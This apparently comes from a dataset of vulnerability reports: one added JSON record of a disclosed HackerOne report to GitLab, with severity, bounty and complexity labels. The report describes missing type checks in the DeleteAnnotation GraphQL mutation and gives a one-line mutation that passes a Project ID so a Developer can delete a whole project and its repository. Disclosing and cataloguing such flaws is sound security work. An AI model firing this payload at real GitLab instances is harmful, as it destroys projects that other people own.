@@ -1,0 +1,38 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "ledz1996 ",
+  "title": "Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ...",
+  "content": "\nSummary\nSimilar bug to #858671, but this time with annotations mutation: DeleteAnnotation\nin app/graphql/mutations/metrics/dashboard/annotations/base.rb\nCode 363 Bytes\n1module Mutations\n2  module Metrics\n3    module Dashboard\n4      module Annotations\n5        class Base < BaseMutation\n6          private\n7\n8          # This method is defined here in order to be used by `authorized_find!` in the subclasses.\n9          def find_object(id:)\n10            GitlabSchema.object_from_id(id)\n11          end\n12        end\n13      end\n14    end\n15  end\n16end\n17\nThere is no type check for find_object in app/graphql/mutations/metrics/dashboard/annotations/delete.rb\nCode 160 Bytes\n1    annotation = authorized_find!(id: id)\n2\n3            result = ::Metrics::Dashboard::Annotations::DeleteService.new(context[:current_user], annotation).execute\nAnd luckily, Developer is sufficient for the permission check\napp/services/metrics/dashboard/annotations/delete_service.rb\nCode 72 Bytes\n1Ability.allowed?(user, :delete_metrics_dashboard_annotation, annotation)\nSteps to reproduce\nFor User A, Create project A Private adding User B as Developer\nFor User B, execute the following mutation in http://gitlab.example.vm/-/graphql-explorer\nCode 108 Bytes\n1mutation {\n2  deleteAnnotation(input: {id: \"gid://Gitlab/Project/<project-id>\"}) {\n3    clientMutationId\n4  }\n5}\nProject disappear along with Repository\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nResults of GitLab environment info\nCode 901 Bytes\n1System information\n2System:     \n3Proxy:      no\n4Current User:   git\n5Using RVM:  no\n6Ruby Version:   2.6.6p146\n7Gem Version:    2.7.10\n8Bundler Version:1.17.3\n9Rake Version:   12.3.3\n10Redis Version:  5.0.9\n11Git Version:    2.27.0\n12Sidekiq Version:5.2.9\n13Go Version: unknown\n14\n15GitLab information\n16Version:    13.2.3-ee\n17Revision:   640e2695514\n18Directory:  /opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter: PostgreSQL\n20DB Version: 11.7\n21URL:        http://gitlab.example.vm\n22HTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git\n23SSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git\n24Elasticsearch:  no\n25Geo:        no\n26Using LDAP: no\n27Using Omniauth: yes\n28Omniauth Providers: \n29\n30GitLab Shell\n31Version:    13.3.0\n32Repository storage paths:\n33- default:  /var/opt/gitlab/git-data/repositories\n34GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\n35Git:        /opt/gitlab/embedded/bin/git\nImpact\nUnauthorized deleting of repository/project by maintainers, developers\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Type Confusion"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1604351520,
+  "report_url": "https://hackerone.com/reports/960244",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "For User A, create a private Project A and add User B as a Developer"
+    ],
+    [
+      2,
+      "For User B, execute the GraphQL mutation to delete an annotation with the Project's ID instead of an annotation ID"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows a Developer to delete a Project, Repository, or Group by exploiting insufficient type checking in the DeleteAnnotation mutation. The mutation accepts any ID without verifying it's an annotation ID, and the permission check only requires Developer privileges.",
+  "reason": "The vulnerability involves understanding GraphQL mutations and ID handling, but the core issue is straightforward once the pattern of missing type checks is recognized. The attack doesn't require complex state manipulation or novel logic.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "858671"
+}
